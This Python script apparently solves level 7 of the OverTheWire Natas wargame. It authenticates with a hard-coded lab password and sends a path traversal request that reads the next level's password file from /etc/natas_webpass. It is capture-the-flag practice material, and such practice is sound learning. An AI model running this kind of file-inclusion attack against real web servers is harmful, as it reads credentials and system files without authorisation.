# webscraper for natas7
import requests
from bs4 import BeautifulSoup

username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
url = 'http://%s.natas.labs.overthewire.org/' % username
proxies = {
    'http': 'http://127.0.0.1:6996',
    'https': 'http://127.0.0.1:6996',
}

def initialRequest():
    session = requests.Session()
    resp = session.get(url, auth=(username, password))
    content = resp.text
    soup = BeautifulSoup(content, 'html.parser')
    print(content)
    lfiURI = '/index.php?page=/../../../etc/natas_webpass/natas8' #LFI URI
    resp2 = session.get(url + lfiURI, auth=(username, password))
    passwordText = resp2.text
    print(passwordText)


viewSource = initialRequest()

